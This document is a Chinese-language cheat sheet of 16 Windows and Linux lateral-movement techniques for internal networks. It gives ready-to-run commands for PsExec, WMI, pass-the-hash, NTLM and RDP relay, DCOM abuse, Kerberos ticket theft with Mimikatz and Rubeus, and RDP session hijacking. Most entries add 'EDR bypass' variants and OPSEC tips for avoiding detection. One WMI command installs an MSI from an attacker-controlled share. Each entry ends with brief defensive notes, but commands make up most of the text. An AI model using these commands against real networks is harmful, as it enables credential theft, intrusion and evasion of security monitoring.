# 横向移动

_16 条 intranet payload_

### PsExec横向移动  `lateral-psexec`
_使用PsExec进行横向移动_
子类：**SMB** · tags: `psexec` `lateral` `smb` `windows`

**前置条件：**
- 目标机器开放445端口
- 拥有目标机器管理员凭证
- ADMIN$共享可访问

**攻击链：**

**基本使用**
> 使用Impacket的psexec.py连接目标
_platform: linux_
```
psexec.py domain/user:password@target_ip
```
**语法解析：**
- `psexec.py` — Impacket工具，实现PsExec功能 _command_
- `domain/user:password` — 认证信息格式 _value_
- `@target_ip` — 目标IP地址 _value_

**使用哈希连接**
> 使用NTLM哈希进行Pass-the-Hash
_platform: linux_
```
psexec.py -hashes :NTLM_HASH domain/user@target_ip
```
**语法解析：**
- `-hashes` — 指定哈希认证 _parameter_
- `:NTLM_HASH` — NTLM哈希值(LM:NTLM格式，LM留空) _value_

**执行命令**
> 在目标机器执行命令
_platform: linux_
```
psexec.py domain/user:password@target_ip "whoami"
```

**Windows PsExec**
> 使用Sysinternals PsExec
_platform: windows_
```
PsExec.exe \\target_ip -u domain\user -p password cmd.exe
```
**语法解析：**
- `\\target_ip` — 目标机器IP _value_
- `-u` — 指定用户名 _parameter_
- `-p` — 指定密码 _parameter_

**EDR 绕过变体：**

**自定义服务名**
> 使用自定义服务名避免检测
```
psexec.py -service-name CustomService domain/user:password@target_ip
```

**SMBExec替代**
> 使用smbexec.py，不写入磁盘
```
smbexec.py domain/user:password@target_ip
```


**分析：** PsExec通过SMB协议在目标机器创建服务并执行命令，成功后可获得目标机器的Shell。

**OPSEC 提示：**
- PsExec会在目标机器创建服务，容易被检测
- 服务名称和二进制文件可能触发告警
- 考虑使用更隐蔽的横向移动方式

**概述：** PsExec是Sysinternals套件中的工具，允许在远程机器上执行进程。攻击者常用于横向移动。

**漏洞原理：** PsExec利用SMB协议和Windows服务机制，通过ADMIN$共享上传可执行文件并创建服务执行。

**利用方法：** 利用流程：1) 获取目标机器凭证；2) 通过SMB连接目标；3) 上传可执行文件到ADMIN$；4) 创建并启动服务；5) 获取远程Shell。

**防御措施：** 防御措施：1) 禁用ADMIN$共享；2) 限制SMB访问；3) 监控服务创建；4) 部署EDR检测异常行为。

---

### WMI横向移动  `lateral-wmi`
_使用WMI进行横向移动_
子类：**WMI** · tags: `wmi` `lateral` `windows` `remote`

**前置条件：**
- 目标机器开放135端口
- 拥有目标机器管理员凭证
- WMI服务可访问

**攻击链：**

**WMI执行命令**
> 使用WMIC远程执行命令
_platform: windows_
```
wmic /node:target_ip /user:domain\user /password:pass process call create "cmd.exe /c whoami"
```
**语法解析：**
- `wmic` — Windows管理工具命令行 _command_
- `/node:` — 指定目标机器 _parameter_
- `/user:` — 指定用户名 _parameter_
- `process call create` — 调用创建进程方法 _command_

**Impacket wmiexec**
> 使用Impacket的wmiexec.py
_platform: linux_
```
wmiexec.py domain/user:password@target_ip
```
**语法解析：**
- `wmiexec.py` — Impacket WMI执行工具 _command_

**使用哈希**
> Pass-the-Hash通过WMI
_platform: linux_
```
wmiexec.py -hashes :NTLM_HASH domain/user@target_ip
```

**PowerShell WMI**
> 使用PowerShell WMI
_platform: windows_
```
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami" -ComputerName target_ip -Credential $cred
```
**语法解析：**
- `Invoke-WmiMethod` — PowerShell WMI方法调用 _command_
- `Win32_Process` — WMI进程类 _value_
- `-ComputerName` — 目标计算机名 _parameter_

**EDR 绕过变体：**

**WMI事件订阅**
> 通过WMI安装MSI包执行代码
```
wmic /node:target_ip /user:domain\user /password:pass path win32_product call install /package:"\\attacker\share\malware.msi"
```


**分析：** WMI横向移动不会在目标机器创建服务，相对PsExec更隐蔽。

**OPSEC 提示：**
- WMI执行不会留下明显的文件痕迹
- 但WMI活动可能被监控
- 命令输出通过临时文件获取

**概述：** WMI(Windows Management Instrumentation)是Windows管理框架的核心组件，可用于远程管理和命令执行。

**漏洞原理：** WMI允许管理员远程管理Windows系统，攻击者可以利用此功能执行命令和横向移动。

**利用方法：** 利用流程：1) 获取目标凭证；2) 通过WMI连接目标；3) 调用Win32_Process创建进程；4) 执行命令获取结果。

**防御措施：** 防御措施：1) 限制WMI远程访问；2) 监控WMI活动；3) 部署EDR检测异常WMI调用；4) 使用防火墙限制135端口。

---

### Pass-the-Hash攻击  `pass-the-hash`
_使用NTLM哈希进行身份验证_
子类：**认证攻击** · tags: `pth` `ntlm` `hash` `authentication`

**前置条件：**
- 获取用户NTLM哈希
- 目标机器允许NTLM认证
- 目标机器开放SMB/WMI端口

**攻击链：**

**Impacket PtH**
> 使用Impacket进行PtH
_platform: linux_
```
psexec.py -hashes :NTHASH domain/user@target_ip
```
**语法解析：**
- `-hashes` — 指定哈希认证 _parameter_
- `:NTHASH` — NTLM哈希(LM:NTLM格式) _value_

**CrackMapExec PtH**
> 使用CrackMapExec进行PtH
_platform: linux_
```
crackmapexec smb target_ip -u user -H NTHASH -d domain
```
**语法解析：**
- `crackmapexec smb` — CrackMapExec SMB模块 _command_
- `-H` — 指定NTLM哈希 _parameter_

**Windows PtH**
> 使用Mimikatz进行PtH
_platform: windows_
```
sekurlsa::pth /user:Administrator /domain:target.com /ntlm:NTHASH
```

**PowerShell PtH**
> 使用PowerShell进行PtH
_platform: windows_
```
Invoke-SMBClient -Domain domain -User user -Hash NTHASH -Target target_ip
```

**EDR 绕过变体：**

**Overpass-the-Hash**
> 将哈希转换为Kerberos票据
```
sekurlsa::pth /user:Administrator /domain:target.com /ntlm:NTHASH /run:cmd.exe
```


**分析：** PtH成功后可以该用户身份访问目标机器，无需明文密码。

**OPSEC 提示：**
- PtH不会产生登录日志中的密码验证
- 但会留下网络登录日志
- 注意时间戳和来源IP

**概述：** Pass-the-Hash是一种利用NTLM哈希进行身份验证的攻击技术，攻击者无需知道明文密码即可通过认证。

**漏洞原理：** NTLM认证机制允许使用密码哈希进行认证，一旦哈希泄露，攻击者可以冒充用户身份。

**利用方法：** 利用流程：1) 获取用户NTLM哈希；2) 使用工具进行PtH；3) 获取目标机器访问权限；4) 执行后续攻击。

**防御措施：** 防御措施：1) 限制NTLM认证；2) 启用Kerberos；3) 监控异常登录；4) 使用受限管理模式。

---

### NTLM Relay攻击  `ntlm-relay`
_NTLM中继攻击技术_
子类：**认证攻击** · tags: `ntlm` `relay` `smb` `authentication`

**前置条件：**
- 目标机器开放SMB端口
- 目标机器未启用SMB签名
- 可诱导目标机器认证

**攻击链：**

**Responder监听**
> 启动Responder监听NTLM认证
_platform: linux_
```
responder -I eth0 -wrf
```
**语法解析：**
- `responder` — NTLM/LLMNR/NBT-NS欺骗工具 _command_
- `-I` — 指定网络接口 _parameter_
- `-wrf` — 启用WPAD、Finger、FTP服务 _parameter_

**ntlmrelayx攻击**
> 使用ntlmrelayx进行中继攻击
_platform: linux_
```
ntlmrelayx.py -tf targets.txt -smb2support
```
**语法解析：**
- `ntlmrelayx.py` — Impacket NTLM中继工具 _command_
- `-tf` — 目标文件 _parameter_
- `-smb2support` — 支持SMB2协议 _parameter_

**中继到LDAP**
> 中继到LDAP进行权限提升
_platform: linux_
```
ntlmrelayx.py -t ldap://dc_ip -smb2support --escalate-user user
```

**IPv6中继**
> 使用IPv6进行NTLM中继
_platform: linux_
```
mitm6 -d domain.com & ntlmrelayx.py -t ldap://dc_ip -wh attacker_ip
```

**EDR 绕过变体：**

**Drop the MIC**
> 移除MIC标志绕过签名验证
```
ntlmrelayx.py -t smb://target --remove-mic
```


**分析：** NTLM Relay成功后可以获取目标机器的访问权限或提升域权限。

**OPSEC 提示：**
- 需要目标机器未启用SMB签名
- 域控制器默认启用签名
- IPv6中继更隐蔽

**概述：** NTLM Relay是一种中间人攻击，攻击者将捕获的NTLM认证中继到其他服务，实现身份冒用。

**漏洞原理：** NTLM协议本身存在设计缺陷，允许中继攻击。如果目标服务器未启用签名验证，攻击者可以冒充受害者身份。

**利用方法：** 利用流程：1) 启动Responder或ntlmrelayx监听；2) 诱导目标机器发起认证；3) 中继认证到目标服务；4) 获取访问权限或执行操作。

**防御措施：** 防御措施：1) 启用SMB签名；2) 禁用NTLM认证；3) 启用Extended Protection for Authentication；4) 监控异常认证行为。

---

### WinRM横向移动  `lateral-winrm`
_通过WinRM进行横向移动_
子类：**WinRM** · tags: `winrm` `lateral` `powershell`

**前置条件：**
- WinRM启用
- 有效凭证

**攻击链：**

**PowerShell远程**
> PowerShell远程会话
_platform: windows_
```
Enter-PSSession -ComputerName target -Credential $cred
```
**语法解析：**
- `Enter-PSSession` — 进入远程PowerShell会话 _command_
- `-ComputerName target` — 目标计算机名 _parameter_
- `-Credential $cred` — 凭据对象 _parameter_

**执行命令**
> 远程执行命令
_platform: windows_
```
Invoke-Command -ComputerName target -ScriptBlock { whoami } -Credential $cred
```

**evil-winrm**
> 使用evil-winrm连接
_platform: linux_
```
evil-winrm -i target -u user -p password
```


**概述：** WinRM是Windows远程管理协议，可用于横向移动。

**漏洞原理：** WinRM默认启用，接受明文凭据。

**利用方法：** 利用流程：1) 确认WinRM启用 2) 使用有效凭证连接

**防御措施：** 防御措施：1) 限制WinRM访问 2) 使用证书认证 3) 监控日志

---

### DCOM横向移动  `lateral-dcom`
_通过DCOM进行横向移动_
子类：**DCOM** · tags: `dcom` `lateral` `com`

**前置条件：**
- DCOM启用
- 有效凭证

**攻击链：**

**MMC20.Application**
> 通过MMC DCOM执行命令
_platform: windows_
```
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","target"))
$com.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c whoami","7")
```
**语法解析：**
- `MMC20.Application` — MMC COM对象 _value_
- `ExecuteShellCommand` — 执行Shell命令方法 _function_
- `"7"` — 窗口状态参数 _value_

**ShellBrowserWindow**
> 通过ShellBrowserWindow执行
_platform: windows_
```
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","target"))
$com.Document.Application.ShellExecute("cmd.exe","/c whoami","c:\windows\system32",$null,0)
```

**Excel DCOM**
> 通过Excel DCOM执行
_platform: windows_
```
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","target"))
$com.DisplayAlerts = $false
$com.DDEInitiate("cmd","/c calc.exe")
```


**概述：** DCOM允许远程创建COM对象并执行代码。

**漏洞原理：** 某些COM对象允许执行系统命令。

**利用方法：** 利用流程：1) 枚举可用COM对象 2) 远程创建实例 3) 执行命令

**防御措施：** 防御措施：1) 限制DCOM远程访问 2) 禁用危险COM对象

---

### SSH横向移动  `lateral-ssh`
_通过SSH进行横向移动_
子类：**SSH** · tags: `ssh` `lateral` `linux`

**前置条件：**
- SSH服务
- 有效凭证

**攻击链：**

**SSH连接**
> 基础SSH连接
_platform: linux_
```
ssh user@target
```

**SSH密钥认证**
> 使用私钥连接
_platform: linux_
```
ssh -i private_key user@target
```
**语法解析：**
- `-i private_key` — 指定私钥文件 _parameter_
- `user@target` — 用户名和目标地址 _value_

**SSH跳板**
> 通过跳板机连接
_platform: linux_
```
ssh -J jump_host user@target
```


**概述：** SSH是Linux环境常用的远程管理协议。

**漏洞原理：** 弱密码、密钥泄露、配置不当。

**利用方法：** 利用流程：1) 发现SSH服务 2) 尝试凭证 3) 连接执行

**防御措施：** 防御措施：1) 禁用密码认证 2) 使用密钥 3) 限制用户

---

### RDP会话劫持  `rdp-hijack`
_劫持已存在的RDP会话_
子类：**RDP** · tags: `rdp` `hijack` `session`

**前置条件：**
- SYSTEM权限
- 存在RDP会话

**攻击链：**

**列出会话**
> 列出所有用户会话
_platform: windows_
```
query user
```

**劫持会话**
> 劫持指定会话
_platform: windows_
```
tscon SESSION_ID /dest:console
```
**语法解析：**
- `tscon` — 终端服务连接命令 _command_
- `SESSION_ID` — 目标会话ID _variable_
- `/dest:console` — 连接到当前控制台 _parameter_

**使用Mimikatz**
> 使用Mimikatz劫持
_platform: windows_
```
ts::sessions
ts::remote /id:SESSION_ID
```


**概述：** RDP会话劫持可以接管其他用户的桌面会话。

**漏洞原理：** SYSTEM权限可以连接任意会话。

**利用方法：** 利用流程：1) 获取SYSTEM权限 2) 列出会话 3) 劫持会话

**防御措施：** 防御措施：1) 限制本地登录 2) 监控会话连接 3) 使用锁屏策略

---

### Overpass-the-Hash  `overpass-the-hash`
_使用哈希获取Kerberos票据_
子类：**PtH** · tags: `pth` `kerberos` `hash`

**前置条件：**
- 用户NTLM哈希
- 域环境

**攻击链：**

**Mimikatz**
> 使用哈希获取Kerberos票据
_platform: windows_
```
sekurlsa::pth /user:Administrator /domain:domain.com /ntlm:HASH /ptt
```
**语法解析：**
- `sekurlsa::pth` — Pass-the-Hash模块 _command_
- `/ntlm:HASH` — 用户NTLM哈希 _parameter_
- `/ptt` — Pass-the-Ticket，注入票据 _parameter_

**Rubeus**
> 使用Rubeus获取票据
_platform: windows_
```
Rubeus.exe asktgt /user:Administrator /domain:domain.com /rc4:HASH /ptt
```

**Impacket**
> 获取Kerberos票据
_platform: linux_
```
getTGT.py domain.com/user -hashes :HASH
```


**概述：** Overpass-the-Hash使用NTLM哈希获取Kerberos票据。

**漏洞原理：** Kerberos可以使用NTLM哈希获取TGT。

**利用方法：** 利用流程：1) 获取用户哈希 2) 请求Kerberos票据 3) 注入使用

**防御措施：** 防御措施：1) 监控异常票据请求 2) 使用智能卡 3) 限制哈希访问

---

### Pass-the-Ticket  `pass-the-ticket`
_使用Kerberos票据进行横向移动_
子类：**PtT** · tags: `ptt` `kerberos` `ticket`

**前置条件：**
- 有效Kerberos票据

**攻击链：**

**导出票据**
> 从内存导出Kerberos票据
_platform: windows_
```
sekurlsa::tickets /export
```

**注入票据**
> 注入票据到当前会话
_platform: windows_
```
kerberos::ptt ticket.kirbi
```
**语法解析：**
- `kerberos::ptt` — Pass-the-Ticket模块 _command_
- `ticket.kirbi` — Kerberos票据文件 _path_

**Rubeus导入**
> 使用Rubeus注入票据
_platform: windows_
```
Rubeus.exe ptt /ticket:base64ticket
```


**概述：** Kerberos票据可以被提取和重用。

**漏洞原理：** Kerberos票据在有效期内可被重用。

**利用方法：** 利用流程：1) 提取票据 2) 转移票据 3) 注入使用

**防御措施：** 防御措施：1) 缩短票据有效期 2) 监控票据使用 3) 使用PAC验证

---

### SMBExec横向移动  `lateral-smbexec`
_通过SMB执行命令_
子类：**SMB** · tags: `smb` `lateral` `exec`

**前置条件：**
- SMB访问权限
- 管理员权限

**攻击链：**

**Impacket smbexec**
> 使用smbexec执行命令
_platform: linux_
```
smbexec.py domain/user:password@target
```

**通过服务执行**
> 创建并启动服务
_platform: windows_
```
sc \\target create evilsvc binPath= "cmd /c whoami"
sc \\target start evilsvc
sc \\target delete evilsvc
```
**语法解析：**
- `sc \\target` — 远程服务控制 _domain_
- `create evilsvc` — 创建服务 _keyword_
- `binPath=` — 服务执行路径 _parameter_


**概述：** SMBExec通过SMB创建服务执行命令。

**漏洞原理：** SMB允许远程服务管理。

**利用方法：** 利用流程：1) 连接SMB 2) 创建服务 3) 执行命令

**防御措施：** 防御措施：1) 禁用SMB 2) 限制远程服务创建 3) 监控服务日志

---

### ATExec横向移动  `lateral-atexec`
_通过计划任务执行命令_
子类：**计划任务** · tags: `at` `scheduled` `lateral`

**前置条件：**
- 计划任务权限
- 管理员权限

**攻击链：**

**Impacket atexec**
> 使用atexec执行命令
_platform: linux_
```
atexec.py domain/user:password@target "whoami"
```

**schtasks**
> 创建远程计划任务
_platform: windows_
```
schtasks /create /s target /tn "evil" /tr "cmd /c whoami" /sc once /st 00:00
```
**语法解析：**
- `/s target` — 目标计算机 _parameter_
- `/tn "evil"` — 任务名称 _parameter_
- `/tr` — 任务执行的程序 _parameter_
- `/sc once` — 执行一次 _parameter_


**概述：** ATExec通过计划任务执行命令。

**漏洞原理：** 计划任务允许远程创建和执行。

**利用方法：** 利用流程：1) 连接目标 2) 创建任务 3) 执行命令

**防御措施：** 防御措施：1) 限制远程任务创建 2) 监控任务日志

---

### WinRS横向移动  `lateral-winrs`
_通过WinRS执行远程命令_
子类：**WinRS** · tags: `winrs` `lateral` `windows`

**前置条件：**
- WinRM启用
- 有效凭证

**攻击链：**

**执行命令**
> 远程执行命令
_platform: windows_
```
winrs -r:target -u:user -p:password "whoami"
```
**语法解析：**
- `-r:target` — 远程目标 _parameter_
- `-u:user` — 用户名 _parameter_
- `-p:password` — 密码 _parameter_

**获取Shell**
> 获取远程CMD
_platform: windows_
```
winrs -r:target -u:user -p:password "cmd"
```


**概述：** WinRS是Windows远程Shell工具，基于WinRM。

**漏洞原理：** WinRM启用时可通过WinRS执行命令。

**利用方法：** 利用流程：1) 确认WinRM启用 2) 使用凭证连接 3) 执行命令

**防御措施：** 防御措施：1) 限制WinRM访问 2) 监控WinRM日志

---

### Excel DCOM横向移动  `lateral-dcom-excel`
_利用Excel DCOM进行横向移动_
子类：**DCOM** · tags: `dcom` `excel` `lateral`

**前置条件：**
- 目标安装Excel
- DCOM权限

**攻击链：**

**Excel DCOM激活**
> 激活Excel DCOM对象
_platform: windows_
```
$com = [Type]::GetTypeFromProgID("Excel.Application","target.com")
$obj = [System.Activator]::CreateInstance($com)
$obj.Visible = $false
```

**执行命令**
> 通过Excel执行命令
_platform: windows_
```
$obj.Workbooks.Add()
$obj.Cells.Item(1,1) = "=CMD|/C calc.exe!A"
$obj.Run("calc.exe")
```
**语法解析：**
- `Excel.Application` — Excel COM对象 _keyword_
- `=CMD|/C` — DDE命令注入 _keyword_

**Impacket DCOM**
> 使用Impacket执行
_platform: linux_
```
python dcomexec.py -object Excel.Application domain/user:password@target.com
```


**概述：** Excel DCOM可用于远程命令执行。

**漏洞原理：** Excel DCOM对象允许远程访问。

**利用方法：** 利用流程：1) 激活DCOM对象 2) 注入命令 3) 执行

**防御措施：** 防御措施：1) 禁用DCOM 2) 限制远程访问 3) 监控DCOM活动

---

### MMC DCOM横向移动  `lateral-dcom-mmc`
_利用MMC DCOM进行横向移动_
子类：**DCOM** · tags: `dcom` `mmc` `lateral`

**前置条件：**
- 目标安装MMC
- DCOM权限

**攻击链：**

**MMC20.Application**
> 使用MMC执行命令
_platform: windows_
```
$com = [Type]::GetTypeFromProgID("MMC20.Application","target.com")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","7")
```
**语法解析：**
- `MMC20.Application` — MMC COM对象 _value_
- `ExecuteShellCommand` — 执行Shell命令方法 _function_

**Impacket执行**
> 使用Impacket
_platform: linux_
```
python dcomexec.py -object MMC20.Application domain/user:password@target.com
```


**概述：** MMC DCOM可用于远程命令执行。

**漏洞原理：** MMC DCOM对象允许远程访问。

**利用方法：** 利用流程：1) 激活MMC DCOM 2) 调用ExecuteShellCommand 3) 执行命令

**防御措施：** 防御措施：1) 禁用DCOM 2) 限制远程访问 3) 监控DCOM活动

---

### RDP Relay攻击  `rdp-relay`
_RDP中继攻击技术_
子类：**RDP** · tags: `rdp` `relay` `lateral`

**前置条件：**
- RDP服务可访问
- 存在NTLM认证

**攻击链：**

**设置中继**
> 设置RDP中继服务器
_platform: linux_
```
使用Impacket:
python ntlmrelayx.py -tf targets.txt -smb2support
或使用rdp_relay.py
```

**诱导连接**
> 诱导用户连接
```
诱导用户连接到攻击者控制的RDP服务器:
1. 发送恶意RDP文件
2. 用户连接时中继到目标
```

**PetitPotam组合**
> PetitPotam + RDP Relay
_platform: linux_
```
python petitpotam.py -d domain -u user -p pass attacker_ip target_ip
结合NTLM中继攻击ADCS
```


**概述：** RDP Relay利用NTLM认证中继攻击。

**漏洞原理：** RDP使用NTLM认证，可被中继。

**利用方法：** 利用流程：1) 设置中继服务器 2) 诱导连接 3) 中继认证

**防御措施：** 防御措施：1) 启用Kerberos 2) 启用CredSSP 3) 网络隔离

---
